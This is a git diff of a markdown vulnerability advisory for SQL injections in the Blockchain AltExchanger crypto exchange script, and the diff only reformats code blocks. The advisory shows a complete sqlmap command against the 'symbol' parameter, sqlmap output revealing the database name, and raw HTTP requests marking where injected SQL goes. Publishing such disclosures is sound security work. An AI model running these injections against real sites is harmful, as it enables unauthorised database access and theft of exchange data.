@@ -21,18 +21,20 @@ Three SQL injections have been discovered in Blockchain AltExchanger cryptocurre
 
 <br>
 
-Vulnerability File: /application/third_party/Chart/TradingView/chart_content/master.php
-
+Vulnerability File:
+```sql
+/application/third_party/Chart/TradingView/chart_content/master.php
+```
 <br>
 
 ### Sqlmap command:
-`
+```sql
 python sqlmap.py -u "http://vulnerable-host.com/application/third_party/Chart/TradingView/chart_content/master.php/history?from=1652650195&resolution=5&symbol=BTC-BCH" -p symbol --dbms=MySQL --banner --random-agent --current-db
-`
+```
 <br>
 
 ### output:
-`
+```sql
 Parameter: symbol (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
@@ -52,7 +54,7 @@ banner: '5.6.50'
 [16:43:26] [INFO] fetching current database
 [16:43:26] [INFO] retrieved: inout_blockchain_altexchanger_db
 current database: 'inout_blockchain_altexchanger_db'
-`
+```
 <br>
 <img src="./resources/Blockchain-AltExchanger-121-sqli-1.png">
 <br>
@@ -61,13 +63,15 @@ current database: 'inout_blockchain_altexchanger_db'
 
 <br>
 
-Vulnerability File: /index.php/coins/update_marketboxslider
-
+Vulnerability File: 
+```sql
+/index.php/coins/update_marketboxslider
+```
 <br>
 
 ### HTTP Request:
 ----------------------------------------------------
-`
+```sql
 POST /index.php/coins/update_marketboxslider HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 X-Requested-With: XMLHttpRequest
@@ -80,7 +84,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Host: vulnerable-host.com
 Connection: Keep-alive
 displaylimit=4&marketcurrency=-INJEQT-SQL-HERE
-`
+```
 ----------------------------------------------------
 
 <br>
@@ -89,13 +93,15 @@ displaylimit=4&marketcurrency=-INJEQT-SQL-HERE
 
 <br>
 
-Vulnerability File: /index.php
-
+Vulnerability File:
+```sql
+/index.php
+```
 <br>
 
 ### HTTP Request:
 ----------------------------------------------------
-`
+```sql
 GET /index.php/home/about HTTP/1.1
 Referer: https://www.google.com/search?hl=en&q=testing
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36
@@ -105,7 +111,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate,br
 Host: vulnerable-host.com
 Connection: Keep-alive
-`
+```
 ----------------------------------------------------
 
 <br>
